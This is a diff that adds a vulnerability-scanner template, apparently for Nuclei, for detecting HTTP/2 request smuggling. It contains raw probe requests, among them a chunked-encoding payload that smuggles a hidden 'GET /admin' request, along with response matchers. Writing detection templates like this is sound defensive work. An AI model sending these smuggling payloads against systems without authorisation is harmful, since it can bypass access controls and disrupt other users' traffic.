@@ -1,0 +1,87 @@
+id: http2-request-smuggling
+info:
+  name: HTTP/2 Request Smuggling Detection
+  author: geeknik
+  severity: high
+  description: |
+    Detects HTTP/2 request smuggling vulnerabilities through various techniques including
+    header injection, stream manipulation, and protocol downgrade attacks.
+  reference:
+    - https://portswigger.net/research/http2
+    - https://www.blackhat.com/us-21/briefings/schedule/#http2-the-sequel-is-always-worse-22668
+  classification:
+    cwe-id: CWE-444
+  tags: http2,smuggling,desync,critical
+  metadata:
+    max-request: 5
+
+http:
+  - raw:
+      - |
+        PRI * HTTP/2.0
+
+        SM
+
+      - |
+        GET /test HTTP/2
+        Host: {{Hostname}}
+        Transfer-Encoding: chunked
+        Content-Length: 0
+
+      - |
+        GET /admin HTTP/2
+        Host: {{Hostname}}
+        X-HTTP2-Settings: AAMAAABkAAQAoAAAAAIAAAAA
+        X-HTTP2-Stream-ID: 1
+        X-HTTP2-Stream-Weight: 256
+
+      - |
+        POST /search HTTP/2
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 13
+        Transfer-Encoding: chunked
+
+        0
+
+        GET /admin HTTP/1.1
+        Host: {{Hostname}}
+
+      - |
+        GET / HTTP/2
+        Host: {{Hostname}}
+        :method: GET
+        :path: /admin
+        :scheme: https
+        :authority: {{Hostname}}
+
+    unsafe: true
+    matchers-condition: or
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "HTTP/2"
+          - "stream error"
+          - "protocol error"
+          - "SETTINGS_ENABLE_PUSH"
+        condition: or
+
+      - type: regex
+        part: header
+        regex:
+          - 'X-HTTP2-Stream-\w+:'
+          - 'X-Forwarded-Proto:\s*h2'
+
+      - type: dsl
+        dsl:
+          - "contains(tolower(all_headers), 'http/2')"
+          - "status_code == 400 || status_code == 421 || status_code == 505"
+        condition: and
+
+    extractors:
+      - type: regex
+        part: header
+        regex:
+          - 'X-HTTP2-Stream-ID:\s*(\d+)'
+          - 'X-HTTP2-Stream-Weight:\s*(\d+)'
